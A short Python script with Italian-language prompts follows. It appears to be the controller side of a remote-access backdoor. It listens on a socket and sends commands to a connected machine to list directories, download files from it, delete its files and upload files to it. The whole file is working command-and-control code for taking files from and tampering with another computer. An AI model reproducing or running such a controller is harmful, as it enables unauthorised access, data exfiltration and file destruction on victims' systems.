import os
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((socket.gethostname(), 8080))

print(f"il server è attualmente in esecuzione\nin attesa di eventuali connessioni in entrata...")
s.listen()
conn, addr = s.accept()
print(f"\n{addr} si è connesso al server con successo\n")
while 1:
	command = input("comando -> ")
	if command == "view_cwd":
		conn.send(command.encode())
		print("\ncomando inviato in attesa di esecuzione...\n")
		files = conn.recv(5000)
		files = files.decode()
		print(f"output del comando: {files}")

	elif command == "custom_dir":
		conn.send(command.encode())
		user_input = input("Dir personalizzata: ")
		conn.send(user_input.encode())
		print("\nil comando è stato inviato\n")
		files = conn.recv(5000)
		files.decode()
		print(f"Risultato Dir personalizzata: {files}")

	elif command == "download_file":
		conn.send(command.encode())
		filepath = input("\nsi prega di inserire il percorso del file incluso il nome del file: ")
		conn.send(filepath.encode())
		file = conn.recv(1000)
		filename = input("\nsi prega di inserire il percorso del file incluso l'estensione: ")
		new_file = open(filename, "wb")
		new_file.write(file)
		new_file.close()
		print(f"\n{filename} è stato scaricato e salvato\n")

	elif command == "remove_file":
		conn.send(command.encode())
		fileanddir = input("si prega di inserire il nome del file e la directory: ")
		conn.send(fileanddir.encode())
		print("\nil comando è stato eseguito correttamente: file rimosso")

	elif command == "send_files":
		conn.send(command.encode())
		file = input("si prega di inserire la directory del file: ")
		filename = input("si prega di inserire il nome del file da inviare: ")
		data = open(file, "rb")
		file_data = data.read(7000)
		conn.send(filename.encode())
		print(f"{filename} è stato inviato con successo")
		conn.send(file_data)

	else:
		print("\ncomando non riconosciuto")